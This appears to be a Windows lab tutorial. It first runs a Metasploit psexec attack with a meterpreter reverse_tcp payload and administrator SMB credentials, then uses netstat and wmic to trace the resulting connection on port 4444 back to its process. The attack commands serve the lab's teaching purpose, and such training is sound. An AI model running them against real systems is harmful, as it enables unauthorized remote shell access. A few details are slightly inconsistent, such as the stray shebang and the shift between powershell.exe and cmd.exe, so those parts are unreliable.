# Windows CLI Lab: Malware Detection and Analysis

### Lab overview

In this hands-on lab, we'll create and execute malware in a controlled environment, then use command-line tools to investigate how an attack manifests on a live Windows system. The most effective way to understand cybersecurity threats is through practical, direct experience. 

### Initial Setup
Begin by elevating your privileges to root access:

#!/bin/bash

# Elevate to root
sudo su -

Launch the Metasploit Framework console:

``` 
bash

msfconsole -q
```

Note: The connection process may take a moment, please be patient while it initializes.

Once connected, your terminal prompt will change to indicate you're in the Metasploit 2 console.

Configuring the Exploit
Select the Windows SMB exploit module:
``` 
bash
use exploit/windows/smb/psexec
```

Configure the payload type:
``` 
bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

Specify the target Windows system's IP address:
``` 
bash
set RHOST (YOUR IP ADDRESS)
```

Set the SMB credentials for authentication:
``` 
bash

set SMBUSER Administrator
set SMBPASS password1234
```

Security Note: Use the password you configured earlier in the lab. Ensure you're using a unique password in your environment.

After configuration, your console should display all the set parameters.

Execute the attack:
```
bash 
exploit
```
## Network Connection Analysis
While this lab environment is simplified, two critical commands help detect attackers mounting network shares:

* net view - Identifies shares being accessed on remote computers
* net session - Shows shares currently mounted on the local system

## Investigating the Malware Connection
Open a Windows PowerShell window and examine all network connections:
``` powershell

netstat -naob
```

This command produces extensive output showing:

* Listening ports (0.0.0.0:portnumber or LISTENING status)
* Active connections to remote systems (ESTABLISHED status)

Focus on the ESTABLISHED connections, particularly the connection using port 4444—this is the port configured for our malware payload.

For additional context about connection endpoints, use:

``` powershell

netstat -f
```
This displays fully qualified domain names (FQDNs), helping you identify legitimate connections you can filter out during analysis.

## Process Investigation

From your earlier netstat -naob output, locate the Process ID (PID) associated with port 4444 and the powershell.exe process.
The output will show loaded DLLs, though in this case, you won't find much suspicious activity at this level.

Dig deeper using Windows Management Instrumentation Command-line (WMIC):
``` powershell

wmic process where processid=[PID] get commandline
```

This reveals that the malicious file was launched directly from the command line without any parameters—a significant indicator of suspicious activity.

Identify the parent process that spawned your malware:
``` powershell

wmic process get name,parentprocessid,processid | select-string [PID]
```

## Investigation Summary
Through this systematic investigation, you've completed the following detection steps:

1 - Identified the malicious network connection (port 4444)
2 - Located the associated process ID
3 - Examined the process command line
4 - Traced back to the parent process ID
5 - Discovered the malware was launched via cmd.exe

Note: Your search may return additional processes launched by the command line interpreter, this is normal and reflects typical system activity.

This methodology demonstrates the fundamental process of threat hunting: starting with network indicators and systematically tracing back to the initial point of compromise.


